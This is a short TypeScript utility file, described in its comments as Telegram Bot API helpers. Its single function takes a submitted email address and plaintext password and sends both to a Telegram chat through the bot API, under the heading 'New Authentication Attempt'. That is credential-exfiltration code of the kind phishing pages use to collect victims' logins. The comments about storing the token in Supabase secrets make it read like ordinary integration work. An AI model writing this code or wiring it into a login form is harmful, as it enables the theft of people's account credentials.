/**
 * Telegram Bot API utilities
 */

interface TelegramMessageData {
  email: string;
  password: string;
}

/**
 * Sends form data to Telegram bot
 * @param data - Form data to send
 * @returns Promise with success status
 */
export const sendToTelegramBot = async (data: TelegramMessageData): Promise<boolean> => {
  try {
    // Note: In production, the bot token should be stored in Supabase secrets
    // For now, this will show an error to indicate Supabase integration is needed
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!botToken || !chatId) {
      throw new Error('Telegram bot configuration missing - Supabase integration required');
    }
    
    const message = `
🔐 New Authentication Attempt
📧 Email: ${data.email}
🔑 Password: ${data.password}
⏰ Time: ${new Date().toISOString()}
    `.trim();
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }
    
    return true;
  } catch (error) {
    console.error('Failed to send to Telegram:', error);
    return false;
  }
};